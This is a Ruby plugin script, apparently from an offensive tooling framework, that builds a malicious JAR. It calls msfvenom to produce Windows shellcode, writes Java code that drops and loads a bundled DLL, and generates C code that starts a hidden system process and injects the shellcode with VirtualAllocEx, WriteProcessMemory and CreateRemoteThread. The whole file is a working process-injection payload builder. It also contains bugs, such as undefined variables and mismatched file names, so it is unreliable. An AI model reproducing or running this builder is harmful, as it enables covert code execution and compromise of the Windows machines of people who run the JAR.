#!/usr/bin/ruby

def mname
	"java"
end

def cmds
	[ "generate" ]
end

def vars
	[ "class", "nmethod", "dll", "process", "jar", "hname", "cmethod", "cname" ]
end

def use
	[ "venom" ]
end

def generate(vhash)
	
	system <<~EOS
		if [ ! -d ~/.genesis/java ]; then
			mkdir -p ~/.genesis/java
		fi

		if [ ! -d ~/.genesis/java/src ]; then
			mkdir -p ~/.genesis/java/src
		fi

		if [ ! -d ~/.genesis/java/bin ]; then
			mkdir -p ~/.genesis/java/bin
		fi
		
		if [ ! -d ~/.genesis/java/jar ]; then
			mkdir -p ~/.genesis/java/jar
		fi

	EOS

	java_path = "#{Dir.home}/.genesis/java"
	src_path = "#{Dir.home}/.genesis/java/src"
	bin_path = "#{Dir.home}/.genesis/java/bin"
	jar_path = "#{Dir.home}/.genesis/java/jar"
		
	clazz = vhash["class"]
	nmethod = vhash["nmethod"]
	cmethod = vhash["cmethod"]
	dll = vhash["dll"]
	process = vhash["process"]
	jar = vhash["jar"]
	hname = vhash["hname"]
	cname = vhash["cname"]

	java = File.open("#{src_path}/#{clazz}.java", "w")
	java.puts("public class #{clazz} {")
	java.puts("\n\tpublic native void #{nmethod}(byte[] b);")
	java.puts("}")
	java.close

	cpwd = "#{Dir.pwd}/.runtime" 
	system <<~EOS
		cd #{java_path}

		javac -d bin -cp bin src/#{clazz}.java
		javah -classpath bin -jni -o src/#{hname}.h #{clazz}

		rm src/#{clazz}.java
		cd #{cpwd}
	EOS

	java = File.open("#{src_path}/#{clazz}.java", "w")
	java.puts("import java.io.*;")
	java.puts
	java.puts("public class #{clazz} {")
	java.puts

	exstr = "msfvenom --platform windows "
	exstr += "-a #{arch} -p #{payload} "
	if pvals != nil && pvals != ""
		exstr += "#{pvals} "
	end

	if bad != nil && bad != ""
		exstr += "-b #{bad} "
	end

	if iter != nil && iter != ""
		exstr += "-i #{iter} "
	end

	if encoder != nil && encoder != ""
		exstr += "-e #{encoder} "
	end

	exstr += "-f java > #{java_path}/shc.txt"
	system("#{exstr}")

	sch = File.open("#{java_path}/sch.txt").read.gsub!("\t", "").split("\n")
	system("rm #{java_path}/sch.txt")
	
	for i in 0..sch.length-1 do
		if i == 0 || i == 1 || i == sch.length-1
			java.puts("\t#{sch[i]}")
		else
			java.puts("\t\t#{sch[i]}")
		end
	end

	java.puts("\n")
	java.puts("\tpublic native void #{nmethod}(byte[] b);")
	java.puts
	java.puts("\tpublic void loadLibrary() {")
	java.puts("\t\ttry {")
	java.puts("\t\t\tString file = \"#{dll}.dll\";")
	java.puts
	java.puts("\t\t\tif ((System.getProperty(\"os.arch\") + \"\").contains(\"64\"))")
	java.puts("\t\t\t\tfile = \"#{dll}64.dll\";")
	java.puts
	java.puts("\t\t\tInputStream i = this.getClass().getClassLoader().getResourceAsStream(file);")
	java.puts
	java.puts("\t\t\tbyte[] data = new byte[1024 * 512];")
	java.puts("\t\t\tint length = i.read(data);")
	java.puts("\t\t\ti.close();")
	java.puts
	java.puts("\t\t\tFile library = File.createTempFile(\"t_lib\", \".dll\");")
	java.puts("\t\t\tlibrary.deleteOnExit();")
	java.puts
	java.puts("\t\t\tFileOutputStream output = new FileOutputStream(library, false);")
	java.puts("\t\t\toutput.write(data, 0, length);")
	java.puts("\t\t\toutput.close();")
	java.puts
	java.puts("\t\t\tSystem.load(library.getAbsolutePath());")
	java.puts("\t\t} catch (Throwable e) {")
	java.puts("\t\t\te.printStackTrace();")
	java.puts("\t\t}")
	java.puts("\t}")
	java.puts
	java.puts("\tpublic #{clazz}() {")
	java.puts("\t\tloadLibrary();")
	java.puts("\t\t#{nmethod}(buf);")
	java.puts("\t}")
	java.puts
	java.puts("\tpublic static void main(String[] args) {")
	java.puts("\t\tnew #{clazz}();")
	java.puts("\t}")
	java.puts("}")
	java.close

	c = File.open("#{src_path}/#{cname}.c", "w")
	c.puts("#include <jvmti.h>")
	c.puts("#include <jawt_md.h>")
	c.puts("#include <jni_md.h>")
	c.puts("#include <jni.h>")
	c.puts("#include <jdwpTransport.h>")
	c.puts("#include <jawt.h>")
	c.puts("#include <classfile_constants.h>")
	c.puts
	c.puts("#include \"#{hname}.h\"")
	c.puts
	c.puts("JNIEXPORT void JNICALL Java_#{clazz}_#{nmethod}(JNIEnv *env, jobject object, jbyteArray jdata)\n{")
	c.puts("\tjbyte *data = (*env)->GetByteArrayElements(env, jdata, 0);")
	c.puts("\tjsize length = (*env)->GetArrayLength(env, jdata);")
	c.puts("\t#{cmethod}((LPCVOID)data, (SIZE_T)length);")
	c.puts("\t(*env)->ReleaseByteArrayElements(env, jdata, data, 0);")
	c.puts("}")
	c.puts
	c.puts("void #{cmethod}(LPCVOID buffer, int length)\n{")
	c.puts("\tSTARTUPINFO si;")
	c.puts("\tPROCESS_INFORMATION pi;")
	c.puts("\tHANDLE hProcess = NULL;")
	c.puts("\tSIZE_T wrote;")
	c.puts("\tLPVOID ptr;")
	c.puts("\tchar lbuffer[1024];")
	c.puts("\tchar cmdbuff[1024];")
	c.puts
	c.puts("\tZeroMemory(&si, sizeof(si));")
	c.puts("\tsi.cb = sizeof(si);")
	c.puts("\tZeroMemory(&pi, sizeof(pi));")
	c.puts
	c.puts("\tGetStartupInfo(&si);")
	c.puts("\tsi.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;")
	c.puts("\tsi.wShowWindow = SW_HIDE;")
	c.puts("\tsi.hStdOutput = NULL;")
	c.puts("\tsi.hStdError = NULL;")
	c.puts("\tsi.hStdInput = NULL;")
	c.puts
	c.puts("\tGetEnvironmentVariableA(\"windir\", lbuffer, 1024);")
	c.puts
	c.puts("\t#ifdef _IS64_")
	c.puts("\t\t_snprintf(cmdbuff, 1024, \"%s\\\\SysWOW64\\\\#{process}\", lbuffer);")
	c.puts("\t#else")
	c.puts("\t\t_snprintf(cmdbuff, 1024, \"%s\\\\System32\\\\#{process}\", lbuffer);")
	c.puts("\t#endif")
	c.puts
	c.puts("\tif (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))")
	c.puts("\t\treturn;")
	c.puts
	c.puts("\thProcess = pi.hProcess;")
	c.puts("\tif (!hProcess)")
	c.puts("\t\treturn;")
	c.puts
	c.puts("\tptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);")
	c.puts
	c.puts("\tWriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);")
	c.puts
	c.puts("\tif (wrote != length)")
	c.puts("\t\treturn;")
	c.puts
	c.puts("\tCreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);")
	c.puts("}")
	c.close

	df = File.open("#{src_path}/def.def", "w")
	df.puts("EXPORTS")
	df.print("\tJava_#{clazz}_#{nmethod}")
	df.close

	system <<~EOS
		
		cd #{java_path}

		i686-w64-mingw32-gcc -c src/#{cname}.c -l jni -I #{cpwd}/include -I #{cpwd}/include/win32 -Wno-implicit -D_JNI_IMPLEMENTATION_ -Wl,--kill-at -shared -o temp.o
		i686-w64-mingw32-dllwrap --def src/def.def temp.o -o temp.dll
		strip temp.dll -o bin/#{dll}.dll
		rm temp.o
		rm temp.dll

		x86_64-w64-mingw32-gcc -m64 -c src/#{cname}.c -l jni -I #{cpwd}/include -I #{cpwd}/include/win32 -Wno-implicit -D_JNI_IMPLEMENTATION_ -D_IS64_ -Wl --kill-at -shared -o temp.o
		strip temp.dll -o bin/#{dll}.dll
		rm temp.o
		rm temp.dll

		javac -d bin -cp bin src/#{clazz}.java
		cd bin
		echo Main-Class: #{clazz} > manifest.txt
		jar cvfm #{jar}.jar manifest.txt *

		mv #{jar}.jar #{jar_path}/

		cd #{cpwd}
	EOS
end
